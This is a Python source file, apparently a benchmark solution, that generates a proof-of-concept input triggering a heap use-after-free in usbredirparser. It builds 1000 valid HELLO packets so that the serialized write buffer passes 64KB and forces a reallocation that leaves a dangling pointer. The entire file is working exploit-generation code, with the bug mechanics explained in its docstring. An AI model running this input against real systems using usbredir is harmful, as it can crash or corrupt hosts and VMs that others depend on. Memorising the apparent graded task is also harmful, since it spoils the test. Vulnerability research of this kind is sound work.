import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in usbredirparser.
        
        The vulnerability occurs when serializing a parser state with a large amount of buffered 
        write data (outgoing data). If the serialized size exceeds the initial buffer size 
        (64KB), a reallocation occurs, invalidating a pointer to the 'write_buf_count' field 
        which is written to at the end of the serialization process.
        
        To trigger this, we generate a stream of valid USB_REDIR_HELLO packets. Each HELLO 
        packet typically triggers a HELLO response from the parser. By sending enough packets 
        without reading the responses (simulated by the harness/environment buffering them), 
        we build up the write queue to exceed 64KB.
        """
        
        # Protocol Constants
        USB_REDIR_HELLO = 0
        
        # Header structure: uint32 type, uint32 length, uint32 id
        # usbredir uses little-endian
        HEADER_FMT = '<III'
        
        # Payload for USB_REDIR_HELLO
        # struct usb_redir_hello_header { char version[64]; uint32_t capabilities[0]; }
        # Length is 64 bytes.
        version_string = b"usb-redir-0.7"
        payload = version_string.ljust(64, b'\x00')
        payload_len = len(payload)
        
        # Target size calculation:
        # We need the serialized write buffers to exceed 64KB (65536 bytes).
        # Each HELLO response is roughly equivalent to the input packet size (header + payload).
        # Packet size = 12 (header) + 64 (payload) = 76 bytes.
        # 1000 packets * 76 bytes = 76000 bytes, which is safely above 64KB.
        # This matches the magnitude of the ground-truth PoC (~71KB).
        
        num_packets = 1000
        poc_data = bytearray()
        
        for i in range(num_packets):
            # Construct Header
            # Type: HELLO
            # Length: 64
            # ID: Incrementing ID
            header = struct.pack(HEADER_FMT, USB_REDIR_HELLO, payload_len, i)
            
            # Append Header and Payload
            poc_data.extend(header)
            poc_data.extend(payload)
            
        return bytes(poc_data)
